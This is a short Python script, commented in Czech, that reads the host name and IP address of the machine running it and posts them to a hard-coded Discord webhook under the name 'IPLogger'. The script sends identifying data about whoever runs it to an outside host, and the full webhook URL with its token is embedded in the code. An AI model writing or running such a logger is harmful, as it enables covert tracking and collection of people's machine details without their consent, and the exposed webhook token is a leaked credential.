import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

#výpis informací o klientovi
host_name = socket.gethostname()
ip_adresa = socket.gethostbyname(host_name)
print("Host name: ", host_name)
print("IP Adresa: ", ip_adresa)
#samotný webhook
content = "Zpráva"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1459178189006962893/Y8PAZV3Epi3TogwSEIv4C0Oa9oQw87PbE-Y8J80fvB47cO8SCzd3mDRuauGH0WEytH9f", username="IPLogger", content=content)
embed = DiscordEmbed(title=f"IP: {ip_adresa} | Host: {host_name}", color = 123123)
webhook.add_embed(embed)
response = webhook.execute()
